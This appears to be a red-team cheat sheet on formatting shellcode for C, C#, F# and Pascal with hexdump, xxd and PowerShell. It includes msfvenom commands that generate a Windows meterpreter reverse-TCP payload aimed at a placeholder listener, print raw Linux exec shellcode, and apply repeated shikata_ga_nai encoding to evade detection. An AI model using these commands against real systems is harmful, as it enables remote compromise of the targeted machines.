# Commands

Search Tag(s): #helpers

## 01 - Unix Shell

To install `hexdump`.

```
$ sudo apt install -y bsdextrautils
```

To install `xxd`.

```
$ sudo apt install -y xxd
```

Hexadecimal C array shellcode.

```
$ hexdump -ve '"\\\x" 1/1 "%02x"' shellcode.bin

$ xxd -i shellcode.bin
```

One line of hex shellcode format.

```
$ od -A n -t x1 -v shellcode.bin | tr -d "[:space:]"

$ basenc -w 0 --base16hex shellcode.bin

$ xxd -p shellcode.bin | tr -d "\n"

$ hexdump -ve '"\" 1/1 "%x"' shellcode.bin
```

## 02 - Powershell

Read bytes from the shellcode using powershell.

```powershell
PS C:\> $file = "shellcode.bin"

PS C:\> $bytes = [IO.File]::ReadAllBytes($file)
```

C language shellcode format.

```powershell
$shellcode_format = '\x' + (($bytes | ForEach-Object ToString x2) -join '\x')

"`nStandard shellcode format:`n`n" + $shellcode_format | Add-Content ($file + ".b64")`
```

C# shellcode format.

```powershell
$csharpformat = '0x' + (($bytes | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')

$csharpformat = $csharpformat.SubString(0, $csharpformat.Length - 1)

"`nC# formatted shellcode:`n`n" + $csharpformat | Add-Content ($file + ".txt")

$cs_bytes = [System.Text.Encoding]::UTF8.GetBytes($csharpformat)

$cs_b64 = [Convert]::ToBase64($cs_bytes)

"`nBase64 Encoded C# shellcode:`n`n" + $cs_b64 | Add-Content ($file + ".b64")
```

F# shellcode format.

```powershell
$fsharpformat = '0x' + (($bytes | ForEach-Object ToString x2 | ForEach-Object { $_ + 'uy;' }) -join '0x')

$fsharpformat = $fsharpformat.SubString(0, $fsharpformat.Length - 1)

"`nF# formatted shellcode:`n`n" + $fsharpformat | Add-Content ($file + ".txt")
```

## 03 - MSFVenom

Pipe it through hexdump.

```
$ msfvenom -p linux/x86/exec cmd=whoami R | hexdump -ve '"\\\x" 1/1 "%02x"'
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 42 bytes

\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x57\x53\x89\xe1\xcd\x80
```

Any raw shellcode binary even if it's not related to `metasploit-framework` using via `generic/custom` payload.

```
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw > payload-x86.bin

$ msfvenom -p generic/custom payloadfile=./payload-x86.bin -a x86 --platform windows -f c -o sc.c
```

You can also use a calculator program as a shellcode.

```
$ msfvenom -p generic/custom payloadfile=/path/to/file.exe -a x64 --platform windows -f vba-exe
```

Pipe it through msfvenom.

```
$ cat payload-x86.bin | msfvenom -p - -a x86 --platform windows -e x86/shikata_ga_nai -f c -i 9
```

Generate formatted Pascal shellcode.

```
$ msfvenom -p <payload> -f c | sed -r 's/[\x]+/$/g' | sed -r 's/[\]+/,/g' | sed -r 's/["]+//g' | sed -e 's/$/\,/' | cut -c 2-
```

---
## References

- [Shellcode Formatter](https://www.redteam.cafe/red-team/shellcode-injection/shellcode-formatter)